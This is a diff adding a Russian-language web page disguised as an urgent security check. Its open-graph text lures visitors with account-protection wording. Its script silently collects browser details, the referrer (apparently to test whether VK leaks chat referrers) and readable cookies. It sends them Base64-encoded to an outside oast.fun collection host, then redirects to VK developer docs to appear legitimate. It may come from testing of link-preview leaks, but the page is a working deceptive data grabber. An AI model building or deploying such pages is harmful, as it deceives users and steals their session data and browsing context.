@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta property="og:title" content="Срочное обновление безопасности системы">
+    <meta property="og:description" content="Нажмите, чтобы проверить статус вашего аккаунта и защитить данные.">
+    <meta property="og:image" content="https://vignette.wikia.nocookie.net/dota2_gamepedia/images/7/7a/Ward_Staff_of_Faith_icon.png"> <meta property="og:type" content="website">
+
+    <title>Security Check</title>
+</head>
+<body>
+    <h1>Идет проверка системных требований...</h1>
+    
+    <script>
+        (async function() {
+            const oastUrl = "https://jcnxiqrzotvqzopexoxwwtmbg5lqynfli.oast.fun/";
+            
+            // Собираем всё, что браузер отдаст "молча"
+            let info = {
+                ua: navigator.userAgent,
+                lang: navigator.language,
+                ref: document.referrer, // Проверяем, передает ли VK реферер чата
+                url: window.location.href,
+                screen: `${window.screen.width}x${window.screen.height}`
+            };
+
+            // Пытаемся вытащить куки (только не HttpOnly)
+            try {
+                info.cookies = document.cookie;
+            } catch(e) {}
+
+            // Отправляем данные тебе
+            fetch(oastUrl + "?log=" + btoa(JSON.stringify(info)), { mode: 'no-cors' });
+
+            // Редирект для правдоподобности (например, на оф. документацию VK)
+            setTimeout(() => {
+                window.location.href = "https://vk.com/dev";
+            }, 2000);
+        })();
+    </script>
+</body>
+</html>
